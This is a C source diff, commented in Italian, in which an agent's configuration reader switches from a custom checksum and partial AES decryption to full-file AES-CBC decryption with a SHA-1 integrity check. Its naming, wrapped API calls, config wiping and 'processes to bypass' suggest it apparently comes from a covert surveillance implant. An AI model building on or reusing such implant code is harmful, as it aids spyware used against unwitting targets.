@@ -1921,7 +1921,7 @@ BOOL HM_CheckNewConf()
 	CloseHandle(h_conf_file);
 
 	// Verifica che il file sia integro e decifrabile correttamente
-	clear_file = HM_ReadClearConfBSON(H4_CONF_BU);
+	clear_file = HM_ReadClearConf(H4_CONF_BU);
 	if (!clear_file) {
 		HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
 		return FALSE;
@@ -1950,39 +1950,20 @@ BOOL HM_CheckNewConf()
 	return TRUE;
 }
 
-char *HM_ReadClearConfBSON(char *conf_name)
-{
-	// XXX Da modificare
-#define SIZE_JSON 6000
-	char *conf_json;
-	DWORD readn;
-
-	conf_json = (char *)calloc(SIZE_JSON, 1);
-	HANDLE hfile = CreateFile("C:\\config.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
-	ReadFile(hfile, conf_json, SIZE_JSON, &readn, NULL);
-	CloseHandle(hfile);
-	return conf_json;
-}	
-
 // Ritorna una zona di memoria con il file di configurazione
 // in chiaro. Va liberata!!!. Torna NULL se fallisce.
-BYTE *HM_ReadClearConf(char *conf_name)
+#define MINIMUM_CONF_LEN (SHA_DIGEST_LENGTH+1)
+char *HM_ReadClearConf(char *conf_name)
 {
-	HANDLE h_conf_file, h_map = 0;
-	BYTE *conf_memory = NULL;
-	BYTE *conf_memory_clear = NULL;
-	DWORD conf_len = INVALID_FILE_SIZE;
-	DWORD *conf_clear_len;
-	DWORD *file_crc;
-	DWORD temp_len;
-	DWORD end_len;
-	char conf_path[DLLNAMELEN];
 	BYTE iv[BLOCK_LEN];
-	char *ptr;
-	DWORD conf_hash;
-	long long temp_hash;
+	char *conf_memory_clear = NULL;
+	DWORD conf_len = INVALID_FILE_SIZE;
+	BYTE *conf_memory = NULL;
+	HANDLE h_conf_file, h_map = 0;
+	char conf_path[DLLNAMELEN];
+	BYTE crc[SHA_DIGEST_LENGTH];
+	BOOL crc_ok = FALSE;
 
-	end_len = strlen(ENDOF_CONF_DELIMITER) + sizeof(DWORD); // tag di fine piu' CRC
 	// Mappa per comodita' il file di configurazione nella memoria
 	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (h_conf_file != INVALID_HANDLE_VALUE && (h_map = FNC(CreateFileMappingA)(h_conf_file, NULL, PAGE_READONLY, 0, 0, NULL))) {
@@ -1991,14 +1972,14 @@ BYTE *HM_ReadClearConf(char *conf_name)
 	}
 	
 	// Crea una copia in chiaro in memoria
-	if (conf_memory && conf_len!=INVALID_FILE_SIZE && conf_len >= (CLEAR_CONF_LEN + sizeof(DWORD) + end_len)) {
+	if (conf_memory && conf_len!=INVALID_FILE_SIZE && conf_len>MINIMUM_CONF_LEN) {
 		// Alloca la memoria 
-		conf_memory_clear = (BYTE *)malloc(conf_len);
+		conf_memory_clear = (char *)malloc(conf_len);
 		if (conf_memory_clear) {
 			// Decifra il file di conf (assume che la parte cifrata sia gia' stata
 			// paddata).
 			memset(iv, 0, sizeof(iv));
-			aes_cbc_decrypt(&crypt_ctx_conf, iv, conf_memory + CLEAR_CONF_LEN, conf_memory_clear, conf_len - CLEAR_CONF_LEN);
+			aes_cbc_decrypt(&crypt_ctx_conf, iv, conf_memory, (BYTE *)conf_memory_clear, conf_len);
 		}	
 	}
 	
@@ -2010,52 +1991,26 @@ BYTE *HM_ReadClearConf(char *conf_name)
 	if (h_conf_file != INVALID_HANDLE_VALUE)
 		CloseHandle(h_conf_file);
 
-	// Verifica che tutto sia stato decifrato correttamente
-	// (altrimenti non torna niente)
-	if (conf_memory_clear) {
-		// Verifica la lunghezza
-		conf_clear_len = (DWORD *)conf_memory_clear;
-		temp_len = *conf_clear_len;
-		if (temp_len % BLOCK_LEN) {
-			temp_len /= BLOCK_LEN;
-			temp_len++;
-			temp_len *= BLOCK_LEN;
-		}
-		if (temp_len + CLEAR_CONF_LEN != conf_len) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
-		if ( (*conf_clear_len) < end_len) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
+	if (!conf_memory_clear)
+		return NULL;
 
-		// Check della stringa di fine file (riutilizzo la variabile)
-		conf_memory = conf_memory_clear + (*conf_clear_len) - end_len;
-		if (memcmp(ENDOF_CONF_DELIMITER, conf_memory, strlen(ENDOF_CONF_DELIMITER)) != 0) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
-
-		// Controlla il CRC (viene fatto su tutta la parte cifrata, togliendo il CRC stesso)
-		temp_hash = 0;
-		ptr = (char *)conf_memory_clear;
-		for (DWORD i=0; i<(*conf_clear_len)-sizeof(DWORD); i++) {
-			temp_hash++;
-			if (*ptr)
-				temp_hash *= (*ptr);
-			conf_hash = (DWORD)(temp_hash >> 32);
-			temp_hash &= 0xFFFFFFFF;
-			temp_hash ^= conf_hash;
-			ptr++;
-		}
-		conf_hash = (DWORD)temp_hash;
-		file_crc = (DWORD *)(conf_memory_clear + (*conf_clear_len) - sizeof(DWORD));
-		if (*file_crc != conf_hash) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
+	// Check del CRC
+	SHA1Context sha;
+	SHA1Reset(&sha);
+	SHA1Input(&sha, (const unsigned char *)conf_memory_clear, conf_len - SHA_DIGEST_LENGTH);
+	if (SHA1Result(&sha)) {
+		for (int i=0; i<5; i++)
+			sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
+		memcpy(crc, sha.Message_Digest, SHA_DIGEST_LENGTH);
+		if (!memcmp(crc, conf_memory_clear + conf_len - SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH))
+			crc_ok = TRUE;
 	}
+
+	if (!crc_ok) {
+		SAFE_FREE(conf_memory_clear);
+		return NULL;
+	}
+
 	return conf_memory_clear;
 }
 
@@ -2195,7 +2150,7 @@ void HM_UpdateGlobalConf()
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
 
 	// Legge la lista dei processi da bypassare 
-	conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE);
+	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
 	if (conf_memory)
 		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
 	SAFE_FREE(conf_memory);
